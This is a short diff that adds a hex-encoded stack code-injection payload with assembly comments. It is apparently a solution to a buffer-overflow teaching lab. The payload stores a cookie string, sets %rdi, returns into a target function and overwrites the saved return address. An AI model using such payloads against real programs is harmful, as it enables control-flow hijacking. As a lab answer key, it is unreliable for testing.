@@ -1,0 +1,9 @@
+c7 84 24 78 ff ff ff        /* movl   $0x39623935,-0x88(%rsp)   */
+35 39 62 39                 /* -0x88(%rsp) is 0x5561dc20        */
+c7 84 24 7c ff ff ff        /* movl   $0x61663739,-0x84(%rsp)   */
+39 37 66 61                 /* -0x84(%rsp) is 0x5561dc24        */
+c6 44 24 80 00              /* movb   $0x0,-0x80(%rsp)          */
+48 c7 c7 20 dc 61 55        /* mov    $0x5561dc20,%rdi          */
+68 fa 18 40 00              /* pushq  $0x4018fa                 */
+c3                          /* ret                              */
+78 dc 61 55                 /* return address                   */
